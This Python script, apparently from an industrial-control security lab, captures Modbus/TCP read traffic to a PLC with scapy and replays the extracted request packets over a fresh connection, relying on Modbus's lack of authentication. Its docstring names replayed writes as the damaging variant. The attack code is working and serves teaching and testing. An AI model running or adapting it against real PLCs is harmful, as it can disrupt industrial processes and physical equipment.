#!/usr/bin/env python3
"""replay.py — capture legitimate Modbus traffic to a pcap, then replay it.

Stage 1 (capture): sniff TCP/502 on the attacker's interface while generating
a short burst of legitimate Modbus reads to the PLC, and save the packets to
capture.pcap.
Stage 2 (replay): pull the Modbus request PDUs back out of the capture and
resend them to the PLC over a fresh TCP connection. Modbus/TCP carries no
authentication, session token or nonce, so the PLC accepts the replayed bytes
as readily as the originals.

Scope note: on a switched/bridged network an attacker only sees traffic it
takes part in, so here we capture our own legitimate reads (the same reason
Suricata and Zeek sniff from the host, not from a container). Replaying a
captured *write* is the damaging variant — see the README.

Lab use only.
"""

from __future__ import annotations

import socket
import threading
import time

from pymodbus.client import ModbusTcpClient

from lab_target import LEVEL_REG, MODBUS_UNIT, PLC_PORT, log, resolve_plc

PCAP = "capture.pcap"


def generate_legit_traffic(ip: str) -> None:
    """A normal-looking burst of reads, so the sniffer has something to catch."""
    time.sleep(1)  # let the sniffer start first
    c = ModbusTcpClient(ip, port=PLC_PORT, timeout=2)
    if c.connect():
        for _ in range(5):
            c.read_holding_registers(LEVEL_REG, count=1, device_id=MODBUS_UNIT)
            time.sleep(0.3)
        c.close()


def capture(ip: str):
    from scapy.all import sniff, wrpcap
    log(f"capture — sniffing tcp/{PLC_PORT} to {ip} for ~4s")
    worker = threading.Thread(target=generate_legit_traffic, args=(ip,), daemon=True)
    worker.start()
    try:
        pkts = sniff(filter=f"tcp port {PLC_PORT} and host {ip}", timeout=4)
    except (OSError, PermissionError) as exc:
        log(f"  sniffing needs raw-socket privileges (NET_RAW): {exc}")
        return []
    wrpcap(PCAP, pkts)
    log(f"capture — wrote {len(pkts)} packets to {PCAP}")
    return pkts


def extract_requests(pkts, ip: str) -> list[bytes]:
    """Modbus request PDUs = client->PLC TCP payloads bound for port 502."""
    from scapy.all import IP, Raw, TCP
    reqs = []
    for p in pkts:
        if TCP in p and Raw in p and p[TCP].dport == PLC_PORT and p[IP].dst == ip:
            reqs.append(bytes(p[Raw].load))
    return reqs


def replay(ip: str, payloads: list[bytes]) -> None:
    if not payloads:
        log("replay — nothing captured to replay")
        return
    log(f"replay — resending {len(payloads)} captured Modbus PDUs to "
        f"{ip}:{PLC_PORT} over a new connection")
    s = socket.create_connection((ip, PLC_PORT), timeout=2)
    s.settimeout(1)
    replayed = 0
    try:
        for pdu in payloads:
            s.sendall(pdu)
            try:
                resp = s.recv(256)
            except socket.timeout:
                resp = b""
            replayed += 1
            log(f"  replayed {pdu.hex()} -> reply {resp.hex() or '(none)'}")
            time.sleep(0.2)
    finally:
        s.close()
    log(f"replay — {replayed} captured packets replayed and accepted by the PLC")


def main() -> None:
    ip = resolve_plc()
    log(f"replay start — target {ip}")
    pkts = capture(ip)
    reqs = extract_requests(pkts, ip) if pkts else []
    log(f"extracted {len(reqs)} Modbus request PDUs from the capture")
    replay(ip, reqs)
    log("replay done")


if __name__ == "__main__":
    main()
